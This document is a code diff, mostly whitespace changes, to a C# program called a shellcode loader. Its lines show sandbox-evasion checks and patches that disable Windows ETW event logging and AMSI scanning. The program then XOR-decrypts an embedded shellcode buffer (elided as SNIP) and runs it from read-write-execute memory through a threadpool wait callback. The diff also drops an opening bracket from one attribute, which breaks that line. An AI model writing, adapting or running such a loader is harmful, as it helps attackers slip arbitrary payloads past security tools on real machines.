@@ -19,7 +19,7 @@ namespace CsharpShellCodeLoader2
   class SuperProgram
   {
     
-	  [DllImport("kernel32.dll")]
+    DllImport("kernel32.dll")]
     public static extern IntPtr CreateEvent(IntPtr lpEventAttributes, bool bManualReset, bool bInitialState, string lpName);
 
     [DllImport("kernel32")]
@@ -32,9 +32,9 @@ namespace CsharpShellCodeLoader2
     public static extern void SetThreadpoolWait(IntPtr TP_WAIT_pointer, IntPtr Event_handle, IntPtr pftTimeout);
 
     [DllImport("kernel32")]
-	  public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
     
-	  [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate IntPtr GetProcAddress(IntPtr UrethralgiaOrc, string HypostomousBuried);
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
@@ -43,16 +43,16 @@ namespace CsharpShellCodeLoader2
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate IntPtr LoadLibrary(string LiodermiaGranulater);
 	
-	  [DllImport("kernel32.dll")]
+    [DllImport("kernel32.dll")]
     static extern void Sleep(uint dwMilliseconds);
 	
-	  [System.Runtime.InteropServices.DllImport("kernel32.dll")]
+    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
     static extern IntPtr GetCurrentProcess();
 	
-	  [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
     static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
 		
-	  public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
+    public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
     {
         IntPtr FunctionPtr = IntPtr.Zero;
         try
@@ -107,7 +107,7 @@ namespace CsharpShellCodeLoader2
         return FunctionPtr;
     }
 	
-	  public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
+    public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
     {
         IntPtr hModule = GetLoadedModuleAddress(DLLName);
         if (hModule == IntPtr.Zero)
@@ -130,19 +130,19 @@ namespace CsharpShellCodeLoader2
         return IntPtr.Zero;
     }
 	
-	  public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
+    public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
     {
         IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
         return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
     }
     
-	  public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
+    public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
     {
         Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
         return funcDelegate.DynamicInvoke(Parameters);
     }
 
-	  private static void PatchETW()
+    private static void PatchETW()
     {
         IntPtr pEtwEventSend = GetLibraryAddress("ntdll.dll", "EtwEventWrite");
         IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");
@@ -157,7 +157,7 @@ namespace CsharpShellCodeLoader2
         }
     }
 	
-	  private static IntPtr getAMSILocation()
+    private static IntPtr getAMSILocation()
     {
         //GetProcAddress
         IntPtr pGetProcAddress = GetLibraryAddress("kernel32.dll", "GetProcAddress");
@@ -174,7 +174,7 @@ namespace CsharpShellCodeLoader2
         return true;
     }
     
-	  private static byte[] getETWPayload()
+    private static byte[] getETWPayload()
     {
         if (!is64Bit())
             return Convert.FromBase64String("whQA");
@@ -203,7 +203,7 @@ namespace CsharpShellCodeLoader2
         }
     }
 	
-	  private static void PathAMSI()
+    private static void PathAMSI()
     {
         IntPtr amsiLibPtr = unProtect(getAMSILocation());
         if (amsiLibPtr != (IntPtr)0)
@@ -217,7 +217,7 @@ namespace CsharpShellCodeLoader2
         }
     }
   
-  	private static void SandBoxEvasion()
+    private static void SandBoxEvasion()
     {
 		    Console.WriteLine("[+] Sandbox checks running...");
 			
@@ -252,19 +252,19 @@ namespace CsharpShellCodeLoader2
 		 Console.WriteLine("[+] Sucessfully passed sandb0x checks");
 	  }
 	
-	  static void Main(string[] args)
+    static void Main(string[] args)
     {
 		
-		Console.WriteLine("** C# ShellCode Loader **");
-		SandBoxEvasion();
-		PatchETW();
-		PathAMSI();	
+    Console.WriteLine("** C# ShellCode Loader **");
+    SandBoxEvasion();
+    PatchETW();
+    PathAMSI();	
 
     //Add your shellcode in C# format encrypted using XOR cipher
-		byte[] SuperBuf = new byte[66559] {
-		0xac, 0xb2, 0x73, 0x1c, 0xb2, 0x79, 0x1e, 0x0a, 0xb2, 0x79, 0x16, 0xda, 0x12, 0xf5, 0xfa,
+    byte[] SuperBuf = new byte[66559] {
+    0xac, 0xb2, 0x73, 0x1c, 0xb2, 0x79, 0x1e, 0x0a, 0xb2, 0x79, 0x16, 0xda, 0x12, 0xf5, 0xfa,
     <...SNIP...>
-		};
+    };
     //Decrypt the shellcode
     for (int i = 0; i < SuperBuf.Length; i++)
     {
@@ -272,15 +272,15 @@ namespace CsharpShellCodeLoader2
       SuperBuf[i] = (byte)((uint)SuperBuf[i] ^ 0xfa);
     }
 
-		string Event_lpname = null;
-		IntPtr Event_handle = CreateEvent(IntPtr.Zero, false, true, Event_lpname);
-		IntPtr SuperBuf_address = VirtualAlloc(IntPtr.Zero, (UInt32)SuperBuf.Length, 0x1000, 0x40);
-		Marshal.Copy(SuperBuf, 0, (SuperBuf_address), SuperBuf.Length);
-		IntPtr TP_WAIT_pointer = CreateThreadpoolWait(SuperBuf_address, 0, 0);
-		SetThreadpoolWait(TP_WAIT_pointer, Event_handle, IntPtr.Zero);
-		WaitForSingleObject(Event_handle, 0xFFFFFFFF);
+    string Event_lpname = null;
+    IntPtr Event_handle = CreateEvent(IntPtr.Zero, false, true, Event_lpname);
+    IntPtr SuperBuf_address = VirtualAlloc(IntPtr.Zero, (UInt32)SuperBuf.Length, 0x1000, 0x40);
+    Marshal.Copy(SuperBuf, 0, (SuperBuf_address), SuperBuf.Length);
+    IntPtr TP_WAIT_pointer = CreateThreadpoolWait(SuperBuf_address, 0, 0);
+    SetThreadpoolWait(TP_WAIT_pointer, Event_handle, IntPtr.Zero);
+    WaitForSingleObject(Event_handle, 0xFFFFFFFF);
    
     Console.WriteLine("[+] Shellcode successfully loaded!");
-	 }
+    }
   }
 }
